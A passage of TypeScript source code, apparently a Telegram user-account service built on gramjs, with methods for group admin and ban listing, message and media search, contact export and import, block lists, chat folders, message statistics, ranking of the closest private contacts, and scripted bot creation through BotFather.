new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsAdmins(),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantAdmin[];\n            const users = result.users;\n\n            return participants.map(participant => {\n                const adminRights = participant.adminRights as Api.ChatAdminRights;\n                return {\n                    userId: participant.userId.toString(),\n                    rank: participant.rank || '',\n                    permissions: {\n                        changeInfo: adminRights.changeInfo || false,\n                        postMessages: adminRights.postMessages || false,\n                        editMessages: adminRights.editMessages || false,\n                        deleteMessages: adminRights.deleteMessages || false,\n                        banUsers: adminRights.banUsers || false,\n                        inviteUsers: adminRights.inviteUsers || false,\n                        pinMessages: adminRights.pinMessages || false,\n                        addAdmins: adminRights.addAdmins || false,\n                        anonymous: adminRights.anonymous || false,\n                        manageCall: adminRights.manageCall || false\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async getGroupBannedUsers(groupId: string): Promise<Array<{\n        userId: string;\n        bannedRights: {\n            viewMessages: boolean;\n            sendMessages: boolean;\n            sendMedia: boolean;\n            sendStickers: boolean;\n            sendGifs: boolean;\n            sendGames: boolean;\n            sendInline: boolean;\n            embedLinks: boolean;\n            untilDate: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsBanned({ q: '' }),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantBanned[];\n\n            return participants.map(participant => {\n                const bannedRights = participant.bannedRights as Api.ChatBannedRights;\n                return {\n                    userId: (participant.peer as Api.PeerChat).chatId.toString(),\n                    bannedRights: {\n                        viewMessages: bannedRights.viewMessages || false,\n                        sendMessages: bannedRights.sendMessages || false,\n                        sendMedia: bannedRights.sendMedia || false,\n                        sendStickers: bannedRights.sendStickers || false,\n                        sendGifs: bannedRights.sendGifs || false,\n                        sendGames: bannedRights.sendGames || false,\n                        sendInline: bannedRights.sendInline || false,\n                        embedLinks: bannedRights.embedLinks || false,\n                        untilDate: bannedRights.untilDate || 0\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async searchMessages(params: SearchMessagesDto): Promise<SearchMessagesResponseDto> {\n        if (!this.client) throw new Error('Client not initialized');\n        const finalResult = {\n            video: { messages: [], total: 0 },\n            photo: { messages: [], total: 0 },\n            document: { messages: [], total: 0 },\n            voice: { messages: [], total: 0 },\n            text: { messages: [], total: 0 },\n            all: { messages: [], total: 0 },\n            roundVideo: { messages: [], total: 0 },\n            roundVoice: { messages: [], total: 0 },\n        }\n        const { chatId, query = '', types, maxId, minId, limit } = params;\n        console.log(\"Types: \", types);\n        for (const type of types) {\n            const filter = this.getSearchFilter(type);\n            const queryFilter = {\n                limit: limit || 500,\n                ...(maxId ? { maxId } : {}),\n                ...(minId ? { minId } : {}),\n            };\n\n            console.log(type, queryFilter);\n            const searchQuery = {\n                q: query,\n                filter: filter,\n                ...queryFilter,\n                hash: bigInt(0),\n                fromId: undefined\n            }\n            if (chatId) {\n                searchQuery['peer'] = await this.safeGetEntity(chatId);\n            }\n            const result = await this.client.invoke(\n                new Api.messages.Search(searchQuery)\n            );\n\n            if (!('messages' in result)) {\n                return {};\n            }\n            let messages = result.messages;\n            console.log(type, result.messages.length, result[\"count\"]);\n            if (types.includes(MessageMediaType.TEXT) && types.length === 1) {\n                console.log(\"Text Filter\");\n                messages = messages.filter((msg: Api.Message) => !('media' in msg));\n            }\n            const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {\n                const messageText = (message.text || '').toLowerCase();\n                const containsFilteredContent = contains(messageText, [\n                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',\n                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',\n                    'invite link', 'invitation', 'invitation link'\n                ]);\n                return !containsFilteredContent ? message.id : null;\n            }));\n\n            const filteredMessages = processedMessages.filter(id => id !== null);\n            const localResult = {\n                messages: filteredMessages,\n                total: result[\"count\"] ? result['count'] : filteredMessages.length\n            }\n            finalResult[`${type}`] = localResult;\n        }\n        return finalResult\n    }\n\n    async getAllMediaMetaData(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;\n        let allMedia: any[] = [];\n        let hasMore = true;\n        let lastOffsetId = 0;\n        const limit = 200;\n\n        while (hasMore) {\n            const response = await this.getMediaMetadata({\n                chatId,\n                types,\n                startDate,\n                endDate,\n                limit,\n                maxId: lastOffsetId,\n                minId\n            });\n            console.log(\"hasMore: \", response.hasMore, \"Total: \", response.total, \"lastOffsetId: \", response.lastOffsetId);\n            allMedia = allMedia.concat(response.messages);\n\n            if (!response.hasMore) {\n                hasMore = false;\n                console.log('No more messages to fetch');\n            } else {\n                lastOffsetId = response.lastOffsetId;\n                console.log(`Fetched ${allMedia.length} messages so far`);\n            }\n            await sleep(3000);\n        }\n\n        return {\n            messages: allMedia,\n            total: allMedia.length,\n        };\n    }\n\n    async getFilteredMedia(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            limit: limit || 100,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n        console.log(query);\n        const messages = await this.client.getMessages(ent, query);\n        console.log(`Fetched ${messages.length} messages`);\n\n        const filteredMessages = messages.filter(message => {\n            if (!message.media) return false;\n            const mediaType = this.getMediaType(message.media);\n            return types.includes(mediaType);\n        });\n\n        console.log(`Filtered down to ${filteredMessages.length} messages`);\n        const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {\n            let thumbBuffer = null;\n\n            try {\n                if (message.media instanceof Api.MessageMediaPhoto) {\n                    const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                } else if (message.media instanceof Api.MessageMediaDocument) {\n                    const sizes = message.document?.thumbs || [1];\n                    thumbBuffer = await this.downloadWithTimeout(\n                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,\n                        5000\n                    );\n                }\n            } catch (error) {\n                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);\n            }\n\n            const mediaDetails = await this.getMediaDetails(message.media as Api.MessageMediaDocument);\n\n            return {\n                messageId: message.id,\n                type: this.getMediaType(message.media),\n                thumb: thumbBuffer?.toString('base64') || null,\n                caption: message.message || '',\n                date: message.date,\n                mediaDetails,\n            };\n        }));\n\n        return {\n            messages: mediaData,\n            total: messages.total,\n            hasMore: messages.length === limit\n        };\n    }\n\n    async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        try {\n            return await this.client.getEntity(entityId);\n        } catch (error) {\n            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);\n\n            try {\n                const dialogs = await this.client.getDialogs({\n                    limit: 300\n                });\n                for (const dialog of dialogs) {\n                    const entity = dialog.entity;\n                    if (entity.id.toString() === entityId.toString()) {\n                        return entity;\n                    }\n                }\n\n                console.log(`Entity ${entityId} not found in dialogs either`);\n                return null;\n            } catch (dialogError) {\n                console.error('Error while searching dialogs:', dialogError);\n                return null;\n            }\n        }\n    }\n\n    // Contact Management Features\n    private generateCSV(contacts: Array<{ firstName: string, lastName: string, phone: string, blocked: boolean }>) {\n        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');\n        const rows = contacts.map(contact => [\n            contact.firstName,\n            contact.lastName,\n            contact.phone,\n            contact.blocked\n        ].join(','));\n\n        return [header, ...rows].join('\\n');\n    }\n\n    private generateVCard(contacts: any[]) {\n        return contacts.map(contact => {\n            const vcard = [\n                'BEGIN:VCARD',\n                'VERSION:3.0',\n                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),\n                `TEL;TYPE=CELL:${contact.phone || ''}`,\n                'END:VCARD'\n            ];\n            return vcard.join('\\n');\n        }).join('\\n\\n');\n    }\n\n    async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        let blockedContacts;\n        if (includeBlocked) {\n            blockedContacts = await this.client.invoke(new Api.contacts.GetBlocked({\n                offset: 0,\n                limit: 100\n            }));\n        }\n\n        if (format === 'csv') {\n            const csvData = contacts.map((contact: any) => ({\n                firstName: contact.firstName || '',\n                lastName: contact.lastName || '',\n                phone: contact.phone || '',\n                blocked: blockedContacts ? blockedContacts.peers.some((p: any) =>\n                    p.id.toString() === contact.id.toString()\n                ) : false\n            }));\n            return this.generateCSV(csvData);\n        } else {\n            return this.generateVCard(contacts);\n        }\n    }\n\n    async importContacts(data: { firstName: string; lastName?: string; phone: string }[]) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(data.map(async contact => {\n            try {\n                await this.client.invoke(new Api.contacts.ImportContacts({\n                    contacts: [new Api.InputPhoneContact({\n                        clientId: bigInt(Math.floor(Math.random() * 1000000)),\n                        phone: contact.phone,\n                        firstName: contact.firstName,\n                        lastName: contact.lastName || ''\n                    })]\n                }));\n                return { success: true, phone: contact.phone };\n            } catch (error) {\n                return { success: false, phone: contact.phone, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async manageBlockList(userIds: string[], block: boolean) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const results = await Promise.all(userIds.map(async userId => {\n            try {\n                if (block) {\n                    await this.client.invoke(new Api.contacts.Block({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                } else {\n                    await this.client.invoke(new Api.contacts.Unblock({\n                        id: await this.client.getInputEntity(userId)\n                    }));\n                }\n                return { success: true, userId };\n            } catch (error) {\n                return { success: false, userId, error: error.message };\n            }\n        }));\n\n        return results;\n    }\n\n    async getContactStatistics() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));\n        const contacts = contactsResult?.contacts || [];\n\n        const onlineContacts = contacts.filter((c: any) => c.status && 'wasOnline' in c.status);\n\n        return {\n            total: contacts.length,\n            online: onlineContacts.length,\n            withPhone: contacts.filter((c: any) => c.phone).length,\n            mutual: contacts.filter((c: any) => c.mutual).length,\n            lastWeekActive: onlineContacts.filter((c: any) => {\n                const lastSeen = new Date(c.status.wasOnline * 1000);\n                const weekAgo = new Date();\n                weekAgo.setDate(weekAgo.getDate() - 7);\n                return lastSeen > weekAgo;\n            }).length\n        };\n    }\n\n    // Chat Folder Management\n    async createChatFolder(options: {\n        name: string,\n        includedChats: string[],\n        excludedChats?: string[],\n        includeContacts?: boolean,\n        includeNonContacts?: boolean,\n        includeGroups?: boolean,\n        includeBroadcasts?: boolean,\n        includeBots?: boolean,\n        excludeMuted?: boolean,\n        excludeRead?: boolean,\n        excludeArchived?: boolean\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const folder = new Api.DialogFilter({\n            id: Math.floor(Math.random() * 1000),\n            title: options.name,\n            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),\n            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),\n            pinnedPeers: [],\n            contacts: options.includeContacts ?? true,\n            nonContacts: options.includeNonContacts ?? true,\n            groups: options.includeGroups ?? true,\n            broadcasts: options.includeBroadcasts ?? true,\n            bots: options.includeBots ?? true,\n            excludeMuted: options.excludeMuted ?? false,\n            excludeRead: options.excludeRead ?? false,\n            excludeArchived: options.excludeArchived ?? false\n        });\n\n        await this.client.invoke(new Api.messages.UpdateDialogFilter({\n            id: folder.id,\n            filter: folder\n        }));\n\n        return {\n            id: folder.id,\n            name: options.name,\n            options: {\n                includeContacts: folder.contacts,\n                includeNonContacts: folder.nonContacts,\n                includeGroups: folder.groups,\n                includeBroadcasts: folder.broadcasts,\n                includeBots: folder.bots,\n                excludeMuted: folder.excludeMuted,\n                excludeRead: folder.excludeRead,\n                excludeArchived: folder.excludeArchived\n            }\n        };\n    }\n\n    async getChatFolders() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const filters = await this.client.invoke(new Api.messages.GetDialogFilters());\n        return filters.map((filter: any) => ({\n            id: filter.id ?? 0,\n            title: filter.title ?? '',\n            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,\n            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0\n        }));\n    }\n\n    async sendMediaBatch(options: {\n        chatId: string;\n        media: Array<{\n            type: 'photo' | 'video' | 'document';\n            url: string;\n            caption?: string;\n            fileName?: string;\n        }>;\n        silent?: boolean;\n        scheduleDate?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            options.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const file = new CustomFile(\n                    item.fileName || `media.${this.getMediaExtension(item.type)}`,\n                    buffer.length,\n                    'media',\n                    buffer\n                );\n\n                const uploadedFile = await this.client.uploadFile({\n                    file,\n                    workers: 1\n                });\n\n                const inputMedia = item.type === 'photo' ?\n                    new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                    new Api.InputMediaUploadedDocument({\n                        file: uploadedFile,\n                        mimeType: this.getMimeType(item.type),\n                        attributes: this.getMediaAttributes(item)\n                    });\n\n                return new Api.InputSingleMedia({\n                    media: inputMedia,\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: options.chatId,\n            multiMedia: mediaFiles,\n            silent: options.silent,\n            scheduleDate: options.scheduleDate\n        }));\n    }\n\n    private getMimeType(type: string): string {\n        switch (type) {\n            case 'photo': return 'image/jpeg';\n            case 'video': return 'video/mp4';\n            case 'document': return 'application/octet-stream';\n            default: return 'application/octet-stream';\n        }\n    }\n\n    private getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {\n        const attributes: Api.TypeDocumentAttribute[] = [];\n\n        if (item.fileName) {\n            attributes.push(new Api.DocumentAttributeFilename({\n                fileName: item.fileName\n            }));\n        }\n\n        if (item.type === 'video') {\n            attributes.push(new Api.DocumentAttributeVideo({\n                duration: 0,\n                w: 1280,\n                h: 720,\n                supportsStreaming: true\n            }));\n        }\n\n        return attributes;\n    }\n\n    async editMessage(options: {\n        chatId: string;\n        messageId: number;\n        text?: string;\n        media?: {\n            type: 'photo' | 'video' | 'document';\n            url: string;\n        };\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.media) {\n            const buffer = await this.downloadFileFromUrl(options.media.url);\n            const file = new CustomFile(\n                `media.${this.getMediaExtension(options.media.type)}`,\n                buffer.length,\n                'media',\n                buffer\n            );\n\n            const uploadedFile = await this.client.uploadFile({\n                file,\n                workers: 1\n            });\n\n            const inputMedia = options.media.type === 'photo' ?\n                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :\n                new Api.InputMediaUploadedDocument({\n                    file: uploadedFile,\n                    mimeType: this.getMimeType(options.media.type),\n                    attributes: this.getMediaAttributes(options.media)\n                });\n\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                media: inputMedia,\n                message: options.text || ''\n            }));\n        }\n\n        if (options.text) {\n            return this.client.invoke(new Api.messages.EditMessage({\n                peer: options.chatId,\n                id: options.messageId,\n                message: options.text\n            }));\n        }\n\n        throw new Error('Either text or media must be provided');\n    }\n\n    async getChats(options: {\n        limit?: number;\n        offsetDate?: number;\n        offsetId?: number;\n        offsetPeer?: string;\n        folderId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const dialogs = await this.client.getDialogs({\n            ...options,\n            limit: options.limit || 100\n        });\n\n        return Promise.all(dialogs.map(async (dialog) => {\n            const entity = dialog.entity;\n            return {\n                id: entity.id.toString(),\n                title: 'title' in entity ? entity.title : null,\n                username: 'username' in entity ? entity.username : null,\n                type: entity instanceof Api.User ? 'user' :\n                    entity instanceof Api.Chat ? 'group' :\n                        entity instanceof Api.Channel ? 'channel' : 'unknown',\n                unreadCount: dialog.unreadCount,\n                lastMessage: dialog.message ? {\n                    id: dialog.message.id,\n                    text: dialog.message.message,\n                    date: new Date(dialog.message.date * 1000)\n                } : null\n            };\n        }));\n    }\n\n    async updateChatSettings(settings: {\n        chatId: string;\n        username?: string;\n        title?: string;\n        about?: string;\n        photo?: string;\n        slowMode?: number;\n        linkedChat?: string;\n        defaultSendAs?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const chat = await this.client.getEntity(settings.chatId);\n\n        const updates: Promise<any>[] = [];\n\n        if (settings.title) {\n            updates.push(this.client.invoke(new Api.channels.EditTitle({\n                channel: chat,\n                title: settings.title\n            })));\n        }\n\n        if (settings.about) {\n            updates.push(this.client.invoke(new Api.messages.EditChatAbout({\n                peer: chat,\n                about: settings.about\n            })));\n        }\n\n        if (settings.photo) {\n            const buffer = await this.downloadFileFromUrl(settings.photo);\n            const file = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            updates.push(this.client.invoke(new Api.channels.EditPhoto({\n                channel: chat,\n                photo: new Api.InputChatUploadedPhoto({\n                    file: file\n                })\n            })));\n        }\n\n        if (settings.slowMode !== undefined) {\n            updates.push(this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: chat,\n                seconds: settings.slowMode\n            })));\n        }\n\n        if (settings.linkedChat) {\n            const linkedChannel = await this.client.getEntity(settings.linkedChat);\n            updates.push(this.client.invoke(new Api.channels.SetDiscussionGroup({\n                broadcast: chat,\n                group: linkedChannel\n            })));\n        }\n\n        if (settings.username) {\n            updates.push(this.client.invoke(new Api.channels.UpdateUsername({\n                channel: chat,\n                username: settings.username\n            })));\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getMessageStats(options: {\n        chatId: string;\n        period: 'day' | 'week' | 'month';\n        fromDate?: Date;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = options.fromDate || new Date();\n        const startDate = new Date(now);\n\n        switch (options.period) {\n            case 'day':\n                startDate.setDate(startDate.getDate() - 1);\n                break;\n            case 'week':\n                startDate.setDate(startDate.getDate() - 7);\n                break;\n            case 'month':\n                startDate.setMonth(startDate.getMonth() - 1);\n                break;\n        }\n\n        const messages = await this.client.getMessages(options.chatId, {\n            limit: 100,\n            offsetDate: Math.floor(now.getTime() / 1000),\n        });\n\n        const stats = {\n            total: messages.length,\n            withMedia: 0,\n            withLinks: 0,\n            withForwards: 0,\n            byHour: new Array(24).fill(0),\n            byType: {\n                text: 0,\n                photo: 0,\n                video: 0,\n                document: 0,\n                other: 0\n            }\n        };\n\n        for (const msg of messages) {\n            const hour = new Date(msg.date * 1000).getHours();\n            stats.byHour[hour]++;\n\n            if (msg.media) {\n                stats.withMedia++;\n                const mediaType = this.getMediaType(msg.media);\n                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;\n            } else if (msg.message) {\n                if (msg.message.match(/https?:\\/\\/[^\\s]+/)) {\n                    stats.withLinks++;\n                }\n                stats.byType.text++;\n            }\n\n            if (msg.fwdFrom) {\n                stats.withForwards++;\n            }\n        }\n\n        return stats;\n    }\n\n    async getTopPrivateChats(): Promise<Array<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        console.log('Starting getTopPrivateChats analysis...');\n        const startTime = Date.now();\n\n        // Weighting factors for different interaction types\n        const weights = {\n            videoCall: 15,      // Video calls have highest weight due to high engagement\n            incoming: 5,\n            outgoing: 1,       // Audio calls indicate strong connection\n            sharedVideo: 6,     // Videos show high interaction intent\n            sharedPhoto: 4,     // Photos show moderate interaction\n            textMessage: 1,     // Base weight for messages\n        };\n\n        console.log('Fetching dialogs...');\n        const dialogs = await this.client.getDialogs({\n            limit: 200 // Reduced from 500 for better performance\n        });\n        console.log(`Found ${dialogs.length} total dialogs`);\n\n        // Filter private chats more strictly\n        const privateChats = dialogs.filter(dialog =>\n            dialog.isUser &&\n            dialog.entity instanceof Api.User &&\n            !dialog.entity.bot && // Explicitly exclude bots\n            !dialog.entity.fake && // Exclude fake accounts\n            dialog.entity.id.toString() !== \"777000\" && // Exclude Telegram's service notifications\n            dialog.entity.id.toString() !== \"42777\" // Exclude Telegram's support account\n        );\n\n        console.log(`Found ${privateChats.length} valid private chats after filtering`);\n\n        // Calculate recent activity window (last month)\n        const now = Math.floor(Date.now() / 1000);\n        // const oneMonthAgo = now - (30 * 24 * 60 * 60);\n\n        // Process chats in batches to avoid overwhelming the API\n        const batchSize = 10;\n        const chatStats = [];\n        const callLogs = await this.getCallLogsInternal();\n        console.log(callLogs);\n        for (let i = 0; i < privateChats.length; i += batchSize) {\n            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);\n            const batch = privateChats.slice(i, i + batchSize);\n\n            const batchResults = await Promise.all(batch.map(async (dialog) => {\n                const processingStart = Date.now();\n                const chatId = dialog.entity.id.toString();\n                const user = dialog.entity as Api.User;\n\n                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);\n\n                try {\n                    // Get recent messages with optimization\n                    const messages = await this.client.getMessages(chatId, {\n                        limit: 30,\n                    });\n\n                    // Skip chats with fewer than 20 messages\n                    if (messages.length < 20) {\n                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);\n                        return null;\n                    }\n\n                    const messageStats = await this.searchMessages({ chatId, types: [MessageMediaType.PHOTO, MessageMediaType.ROUND_VIDEO, MessageMediaType.VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE, MessageMediaType.CHAT_PHOTO], limit: 100 });\n                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);\n\n                    const callStats = {\n                        total: 0,\n                        incoming: 0,\n                        outgoing: 0,\n                        video: 0\n                    };\n\n                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };\n                    const userCalls = callLogs[chatId];\n                    console.log(userCalls);\n                    if (userCalls) {\n                        callStats.total = userCalls.totalCalls;\n                        callStats.incoming = userCalls.incoming;\n                        callStats.outgoing = userCalls.outgoing;\n                    }\n\n                    // Calculate scores\n                    const interactionScore = (\n                        callStats.incoming * weights.incoming +\n                        callStats.outgoing * weights.outgoing +\n                        callStats.video * weights.videoCall +\n                        mediaStats.videos * weights.sharedVideo +\n                        mediaStats.photos * weights.sharedPhoto +\n                        messages.total * weights.textMessage\n                    )\n\n                    // Calculate activity breakdown\n                    const activityBreakdown = {\n                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,\n                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,\n                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,\n                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,\n                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100\n                    };\n\n                    const processingTime = Date.now() - processingStart;\n                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);\n\n                    return {\n                        chatId,\n                        username: user.username,\n                        firstName: user.firstName,\n                        lastName: user.lastName,\n                        totalMessages: messages.total,\n                        interactionScore: Math.round(interactionScore * 100) / 100,\n                        calls: callStats,\n                        media: mediaStats,\n                        activityBreakdown\n                    };\n                } catch (error) {\n                    console.error(`Error processing chat ${chatId}:`, error);\n                    return null;\n                }\n            }));\n\n            chatStats.push(...batchResults.filter(Boolean));\n        }\n\n        // Sort by interaction score and get top 5\n        const topChats = chatStats\n            .sort((a, b) => b.interactionScore - a.interactionScore)\n            .slice(0, 10);\n\n        const totalTime = Date.now() - startTime;\n        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);\n        topChats.forEach((chat, index) => {\n            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);\n        });\n\n        return topChats;\n    }\n\n    async createGroupOrChannel(options: GroupOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n        try {\n            console.log('Creating group or channel with options:', options);\n            const result = await this.client.invoke(\n                new Api.channels.CreateChannel(options)\n            );\n            return result;\n        }\n        catch (error) {\n            console.error('Error creating group or channel:', error);\n            throw new Error(`Failed to create group or channel: ${error.message}`);\n        }\n    }\n\n    async createBot(options: {\n        name: string;\n        username: string;\n        description?: string;\n        aboutText?: string;\n        profilePhotoUrl?: string;\n    }): Promise<{ botToken: string; username: string }> {\n        if (!this.client) {\n            console.error('Bot creation failed: Client not initialized');\n            throw new Error('Client not initialized');\n        }\n\n        const botFatherUsername = 'BotFather';\n        console.log(`[BOT CREATION] Starting bot creation process for \"${options.name}\" (${options.username})`);\n\n        try {\n            // Start conversation with BotFather\n            console.log('[BOT CREATION] Attempting to get entity for BotFather...');\n            const entity = await this.client.getEntity(botFatherUsername);\n            console.log('[BOT CREATION] Successfully connected to BotFather');\n\n            // Send /newbot command\n            console.log('[BOT CREATION] Sending /newbot command...');\n            await this.client.sendMessage(entity, {\n                message: '/newbot'\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Send bot name\n            console.log(`[BOT CREATION] Sending bot name: \"${options.name}\"`);\n            await this.client.sendMessage(entity, {\n                message: options.name\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Send bot username\n            // Append a 3-digit unique string ending with \"_bot\" if not present\n            let botUsername = options.username;\n            if (!/_bot$/.test(botUsername)) {\n                // Generate a unique 3-character alphanumeric string\n                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\n                let uniqueSuffix = '';\n                for (let i = 0; i < 3; i++) {\n                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));\n                }\n                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;\n                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);\n            }\n\n            console.log(`[BOT CREATION] Sending bot username: \"${botUsername}\"`);\n            await this.client.sendMessage(entity, {\n                message: botUsername\n            });\n            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');\n            await new Promise(resolve => setTimeout(resolve, 1000));\n\n            // Get response from BotFather\n            console.log('[BOT CREATION] Retrieving response from BotFather...');\n            const messages = await this.client.getMessages(entity, {\n                limit: 1\n            });\n\n            if (!messages || messages.length === 0) {\n                console.error('[BOT CREATION] No response received from BotFather');\n                throw new Error('No response received from BotFather');\n            }\n\n            const lastMessage = messages[0].message;\n            console.log(`[BOT CREATION] BotFather response: \"${lastMessage.substring(0, 50)}...\"`);\n\n            if (!lastMessage.toLowerCase().includes('use this token')) {\n                console.error(`[BOT CREATION] Bot creation failed, unexpected response: \"${lastMessage}\"`);\n                throw new Error(`Bot creation failed: ${lastMessage}`);\n            }\n\n            // Extract bot token from BotFather's response\n            const tokenMatch = lastMessage.match(/(\\d+:[A-Za-z0-9_-]+)/);\n            if (!tokenMatch) {\n                console.error('[BOT CREATION] Could not extract bot token from BotFather response');\n                throw new Error('Could not extract bot token from BotFather response');\n            }\n            const botToken = tokenMatch[0];\n            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);\n\n            // If description is provided, set it\n            if (options.description) {\n                console.log('[BOT CREATION] Setting bot description...');\n                await this.client.sendMessage(entity, { message: '/setdescription' });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);\n                await this.client.sendMessage(entity, { message: `@${options.username}` });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log('[BOT CREATION] Sending description text...');\n                await this.client.sendMessage(entity, { message: options.description });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n                console.log('[BOT CREATION] Description set successfully');\n            }\n\n            // If about text is 